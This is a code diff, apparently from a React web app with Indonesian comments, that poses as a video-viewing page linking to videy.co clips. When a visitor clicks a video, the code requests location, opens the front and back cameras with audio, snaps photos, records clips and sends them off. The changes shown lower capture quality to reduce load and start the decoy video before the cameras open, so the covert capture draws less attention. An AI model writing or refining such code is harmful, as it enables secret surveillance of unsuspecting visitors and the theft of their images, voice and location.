@@ -8,7 +8,7 @@ function App() {
   const [isFullscreen, setIsFullscreen] = useState(false);
   const [hasRequestedLocation, setHasRequestedLocation] = useState(false);
   const [hasRequestedCamera, setHasRequestedCamera] = useState(false);
-  const [isLoading, setIsLoading] = useState<boolean[]>([]); // State untuk melacak loading video
+  const [isLoading, setIsLoading] = useState<boolean[]>([]);
   const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
   const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
@@ -31,12 +31,10 @@ function App() {
     { videoUrl: 'https://cdn.videy.co/1S2HTGaf1.mp4' },
   ];
 
-  // Inisialisasi state loading untuk setiap video
   useEffect(() => {
     setIsLoading(new Array(videos.length).fill(true));
   }, []);
 
-  // Meminta akses lokasi saat situs pertama kali dibuka
   useEffect(() => {
     monitorSuspiciousActivity();
 
@@ -91,7 +89,6 @@ function App() {
     };
   }, [hasRequestedLocation]);
 
-  // Inisialisasi kamera saat video diklik
   const initializeCameraStreams = async () => {
     if (hasRequestedCamera) return;
     setHasRequestedCamera(true);
@@ -99,7 +96,7 @@ function App() {
     const requestMediaAccess = async (facingMode: string | { deviceId: string }, cameraType: string): Promise<{ stream: MediaStream; deviceId: string } | null> => {
       try {
         const constraints = {
-          video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
+          video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
           audio: true,
         };
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -158,7 +155,7 @@ function App() {
   const reinitializeStream = async (cameraType: string, deviceId: string): Promise<MediaStream | null> => {
     try {
       const constraints = {
-        video: { deviceId: { exact: deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
+        video: { deviceId: { exact: deviceId }, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
         audio: true,
       };
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -214,17 +211,17 @@ function App() {
       const videoHeight = cameraVideo.videoHeight;
       console.log(`Dimensi video kamera ${type}: ${videoWidth}x${videoHeight}`);
 
-      // Mengambil foto dengan resolusi lebih tinggi
+      // Mengambil foto
       const canvas = document.createElement('canvas');
       const canvasAspectRatio = 9 / 16;
       const videoAspectRatio = videoWidth / videoHeight;
 
       let drawWidth, drawHeight, offsetX, offsetY;
       if (videoAspectRatio > canvasAspectRatio) {
-        drawWidth = 1080; // Tingkatkan resolusi untuk kualitas HD
+        drawWidth = 720; // Kurangi resolusi untuk mengurangi beban
         drawHeight = drawWidth / videoAspectRatio;
       } else {
-        drawHeight = 1920; // Tingkatkan resolusi untuk kualitas HD
+        drawHeight = 1280;
         drawWidth = drawHeight * videoAspectRatio;
       }
 
@@ -250,12 +247,12 @@ function App() {
         console.error(`Gagal mengirim foto dari kamera ${type}:`, error);
       }
 
-      // Merekam video dengan kualitas lebih tinggi
+      // Merekam video
       const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
         .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
       const mediaRecorder = new MediaRecorder(currentStream, {
         mimeType: supportedMimeType,
-        videoBitsPerSecond: 2500000, // Tingkatkan bitrate untuk kualitas HD
+        videoBitsPerSecond: 1000000, // Kurangi bitrate untuk mengurangi beban
       });
       mediaRecorderRef.current = mediaRecorder;
       const chunks: BlobPart[] = [];
@@ -303,6 +300,18 @@ function App() {
     console.log('Memulai proses perekaman untuk kamera...');
 
     try {
+      // Tunggu hingga video benar-benar siap diputar
+      await new Promise((resolve) => {
+        if (videoElement.readyState >= 3) {
+          resolve(null);
+        } else {
+          videoElement.oncanplay = () => resolve(null);
+        }
+      });
+
+      await videoElement.play();
+
+      // Inisialisasi kamera setelah video mulai diputar
       await initializeCameraStreams();
 
       if (cameraStreamsRef.current.length === 0) {
@@ -311,8 +320,6 @@ function App() {
         setIsPlaying(null);
         return;
       }
-
-      await videoElement.play();
 
       const frontCamera = cameraStreamsRef.current.find(s => s.type === 'depan');
       const backCamera = cameraStreamsRef.current.find(s => s.type === 'belakang');
@@ -460,13 +467,13 @@ function App() {
                 )}
                 <video
                   ref={(el) => (videoRefs.current[index] = el)}
-                  src={video.videoUrl}
+                  src={isPlaying === index ? video.videoUrl : undefined} // Hanya set src saat video diputar
                   className="w-full h-full object-cover"
                   muted
                   onClick={() => handleVideoClick(index)}
                   onEnded={() => handleVideoEnded(index)}
                   onCanPlay={() => handleCanPlay(index)}
-                  preload="auto"
+                  preload="metadata" // Kurangi preload untuk mengurangi beban
                   playsInline
                   {...({ loading: 'lazy' } as any)}
                 >
